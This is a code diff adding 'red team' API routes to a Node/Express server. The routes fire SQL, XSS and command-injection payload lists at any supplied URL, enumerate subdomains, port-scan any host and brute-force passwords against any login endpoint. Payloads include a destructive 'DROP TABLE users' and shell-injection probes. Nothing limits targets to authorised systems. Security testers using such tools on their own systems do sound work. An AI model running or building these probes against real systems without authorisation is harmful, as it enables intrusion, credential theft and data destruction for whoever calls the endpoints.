@@ -978,6 +978,198 @@ app.get('/api/security/scan', async (req, res) => {
   }
 });
 
+// ─── RED TEAM TESTING ROUTES ────────────────────────────────────────────────
+
+// Injection probe tool
+app.post('/api/redteam/inject', async (req, res) => {
+  const { url: targetUrl, category = 'sqli' } = req.body || {};
+  if (!targetUrl) return res.status(400).json({ success: false, error: 'url is required' });
+
+  const payloads = {
+    sqli: [
+      { label: "Single Quote",       payload: "'" },
+      { label: "OR 1=1",             payload: "' OR 1=1--" },
+      { label: "UNION SELECT",       payload: "' UNION SELECT null,null--" },
+      { label: "Stacked Query",      payload: "'; DROP TABLE users--" },
+      { label: "Blind Boolean",      payload: "' AND 1=1--" },
+    ],
+    xss: [
+      { label: "Script Tag",         payload: '<script>alert(1)</script>' },
+      { label: "IMG onerror",        payload: '<img src=x onerror=alert(1)>' },
+      { label: "SVG onload",         payload: '<svg onload=alert(1)>' },
+      { label: "Javascript URI",     payload: 'javascript:alert(1)' },
+      { label: "Attribute Inject",   payload: '" onmouseover="alert(1)"' },
+    ],
+    cmdi: [
+      { label: "Semicolon",          payload: '; id' },
+      { label: "Pipe",               payload: '| id' },
+      { label: "Backtick",           payload: '`id`' },
+      { label: "Dollar Subshell",    payload: '$(id)' },
+      { label: "Newline Inject",     payload: '%0a id' },
+    ],
+  };
+
+  const targetPayloads = payloads[category] || payloads['sqli'];
+  const results = [];
+
+  const sqliPatterns = /sql|syntax|mysql|ora-|pg_|sqlite|odbc|jdbc|query|where clause|unclosed quotation/i;
+  const xssPatterns = /<script|alert\(|onerror=|onload=/i;
+  const cmdiPatterns = /uid=|gid=|groups=|root:|sh:|bash:|permission denied|command not found/i;
+
+  const patternMap = { sqli: sqliPatterns, xss: xssPatterns, cmdi: cmdiPatterns };
+  const matchPattern = patternMap[category] || sqliPatterns;
+
+  for (const { label, payload } of targetPayloads) {
+    let probeUrl;
+    try {
+      const u = new URL(targetUrl);
+      u.searchParams.set('q', payload);
+      probeUrl = u.toString();
+    } catch (_) {
+      probeUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
+    }
+
+    let status = null, bodySnippet = '', vulnerable = false, error = null;
+    try {
+      const resp = await fetch(probeUrl, {
+        method: 'GET',
+        signal: AbortSignal.timeout(8000),
+        headers: { 'User-Agent': 'RedTeamProbe/1.0 (Internal Safety Testing)' }
+      });
+      status = resp.status;
+      const text = await resp.text();
+      bodySnippet = text.substring(0, 300);
+      vulnerable = matchPattern.test(text) || status === 500;
+    } catch (e) {
+      error = e.message;
+    }
+
+    results.push({ label, payload, status, bodySnippet, vulnerable, error });
+  }
+
+  res.json({ success: true, category, target: targetUrl, results });
+});
+
+// Subdomain enumeration tool
+app.post('/api/redteam/subdomain', async (req, res) => {
+  const { domain } = req.body || {};
+  if (!domain) return res.status(400).json({ success: false, error: 'domain is required' });
+
+  const cleanDomain = domain.replace(/^https?:\/\//, '').split('/')[0].trim();
+  const wordlist = [
+    'www', 'api', 'mail', 'dev', 'staging', 'admin', 'portal', 'dashboard',
+    'app', 'cdn', 'static', 'assets', 'blog', 'shop', 'store', 'support',
+    'docs', 'help', 'vpn', 'remote', 'git', 'gitlab', 'jenkins', 'ci',
+    'test', 'qa', 'beta', 'preview', 'ftp', 'smtp', 'pop', 'imap',
+    'ns1', 'ns2', 'mx', 'mx1', 'mx2', 'exchange', 'autodiscover',
+    'internal', 'intranet', 'extranet', 'login', 'auth', 'sso', 'id'
+  ];
+
+  const { promises: dnsPromises } = await import('dns');
+  const results = [];
+
+  for (const sub of wordlist) {
+    const candidate = `${sub}.${cleanDomain}`;
+    let resolved = false, addresses = [], error = null;
+    try {
+      const addrs = await dnsPromises.resolve4(candidate);
+      resolved = true;
+      addresses = addrs;
+    } catch (e) {
+      error = e.code || e.message;
+    }
+    results.push({ subdomain: candidate, resolved, addresses, error });
+  }
+
+  const found = results.filter(r => r.resolved);
+  res.json({ success: true, domain: cleanDomain, total: wordlist.length, found: found.length, results });
+});
+
+// Port scan against a target host
+app.post('/api/redteam/portscan', async (req, res) => {
+  const { host, ports: portSpec = 'common' } = req.body || {};
+  if (!host) return res.status(400).json({ success: false, error: 'host is required' });
+
+  const cleanHost = host.trim();
+  const commonPorts = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017];
+  const webPorts = [80,443,8080,8443,8888,3000,3001,5000,5001,8000,8001,9000,9443];
+
+  let portList;
+  if (portSpec === 'web') {
+    portList = webPorts;
+  } else if (portSpec === 'common') {
+    portList = commonPorts;
+  } else {
+    const nums = String(portSpec).split(',').map(p => parseInt(p.trim(), 10)).filter(n => n > 0 && n <= 65535);
+    portList = [...new Set(nums)].slice(0, 50);
+    if (portList.length === 0) portList = commonPorts;
+  }
+
+  const net = await import('net');
+  const results = [];
+
+  const probe = (port) => new Promise((resolve) => {
+    const socket = new net.Socket();
+    const timeout = 1500;
+    let open = false;
+    socket.setTimeout(timeout);
+    socket.on('connect', () => { open = true; socket.destroy(); });
+    socket.on('timeout', () => { socket.destroy(); });
+    socket.on('error', () => { socket.destroy(); });
+    socket.on('close', () => { resolve({ port, open }); });
+    socket.connect(port, cleanHost);
+  });
+
+  const BATCH = 10;
+  for (let i = 0; i < portList.length; i += BATCH) {
+    const batch = portList.slice(i, i + BATCH);
+    const batchResults = await Promise.all(batch.map(probe));
+    results.push(...batchResults);
+  }
+
+  const openPorts = results.filter(r => r.open);
+  res.json({ success: true, host: cleanHost, scanned: results.length, open: openPorts.length, results });
+});
+
+// Auth brute-force simulation tool
+app.post('/api/redteam/auth', async (req, res) => {
+  const { loginUrl, username, passwordList } = req.body || {};
+  if (!loginUrl || !username || !passwordList) {
+    return res.status(400).json({ success: false, error: 'loginUrl, username, and passwordList are required' });
+  }
+
+  const passwords = passwordList.split(/\r?\n/).map(p => p.trim()).filter(Boolean).slice(0, 50);
+  if (passwords.length === 0) {
+    return res.status(400).json({ success: false, error: 'passwordList must contain at least one password' });
+  }
+
+  const results = [];
+  for (const password of passwords) {
+    let status = null, snippet = '', hit = false, error = null;
+    try {
+      const resp = await fetch(loginUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': 'RedTeamProbe/1.0 (Internal Safety Testing)'
+        },
+        body: JSON.stringify({ username, password }),
+        signal: AbortSignal.timeout(8000)
+      });
+      status = resp.status;
+      const text = await resp.text();
+      snippet = text.substring(0, 200);
+      hit = ![401, 403, 429].includes(status);
+    } catch (e) {
+      error = e.message;
+    }
+    results.push({ password, status, snippet, hit, error });
+  }
+
+  const hits = results.filter(r => r.hit);
+  res.json({ success: true, loginUrl, username, attempted: results.length, hits: hits.length, results });
+});
+
 // Suppress browser favicon 404
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
